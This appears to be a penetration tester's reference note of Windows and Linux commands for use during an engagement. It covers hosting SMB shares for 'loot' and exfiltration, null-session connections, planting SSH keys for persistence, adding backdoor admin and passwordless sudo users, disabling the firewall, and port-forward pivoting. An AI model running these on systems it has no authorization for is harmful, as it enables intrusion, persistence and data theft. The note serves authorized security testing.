---
tags: [admin, reference, windows, linux, setup]
---

# 🛠️ Admin & Utility Reference (400/500 Level)

> [!ABSTRACT] 
> This note contains administrative "plumbing" commands. These are essential for setting up listeners, transferring files, and managing persistence/access during an engagement.

---

## 📁 SMB Administration

### 1. Windows: Creating a Share (Quick & Dirty)
Useful for exfiltrating data or hosting tools.
```cmd
# Create a share named 'loot' pointing to C:\Temp
net share loot=C:\Temp /grant:everyone,full

# Remove a share
net share loot /delete
```

### 2. Windows: Connecting to a Share
```cmd
# Map a network drive
net use Z: \<IP>\share /user:<DOMAIN>\<USER> <PASSWORD>

# Unauthenticated (Null Session)
net use \<IP>\IPC$ "" /u:""

# Persistent mount (via PowerShell)
New-PSDrive -Name "L" -PSProvider FileSystem -Root "\<IP>\share" -Credential (Get-Credential)
```

### 3. Linux: Hosting an SMB Server (Impacket)
The fastest way to get files onto/off a Windows target.
```bash
# Standard SMB2 share (no auth)
impacket-smbserver -smb2support share .

# Authenticated SMB share (to bypass some security policies)
impacket-smbserver -smb2support -user <USER> -password <PASS> share .
```

---

## 🔑 SSH & Key Management

### 1. Generating a New Keypair
```bash
# Generate 4096-bit RSA key without a passphrase
ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
```

### 2. Deploying a Public Key (Persistence)
Append your `id_rsa.pub` to the target user's `authorized_keys`.
```bash
# Linux (ensure correct permissions)
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3N..." >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Windows (OpenSSH Server)
# Path: C:\Users\<USER>\.ssh\authorized_keys
# Note: Ensure the "ssh-agent" and "sshd" services are running.
```

### 3. SSH Proxying & Tunnels (Quick View)
*Detailed info in [[Tunneling]]*
```bash
# Dynamic SOCKS Proxy
ssh -D 1080 -N -f user@<IP>

# Local Port Forward (Kali:8080 -> Target:80)
ssh -L 8080:localhost:80 user@<IP>
```

---

## 👥 User & Group Management

### 1. Windows (CMD)
```cmd
# Add a local user
net user <USER> <PASS> /add

# Add user to Administrators group
net localgroup administrators <USER> /add

# Enable RDP for a user
net localgroup "Remote Desktop Users" <USER> /add
```

### 2. Linux (Bash)
```bash
# Add user with home directory and bash shell
useradd -m -s /bin/bash <USER>
echo "<USER>:<PASS>" | chpasswd

# Add to Sudoers (Instant Root)
echo "<USER> ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

---

## 🌐 Network Configuration

### 1. Windows: Disabling Firewall (High Noise)
```cmd
# Disable all profiles
netsh advfirewall set allprofiles state off
```

### 2. Windows: Port Proxying (Built-in Pivot)
```cmd
# Forward local port 4455 to 192.168.1.10:445
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=192.168.1.10

# List and Delete
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=4455 listenaddress=0.0.0.0
```

---

## 🔗 Related Notes
- [[SMB-Modern-PoC]] - For exploiting SMB.
- [[SSH]] - For deep SSH configuration.
- [[File transfer]] - For moving binaries via these protocols.
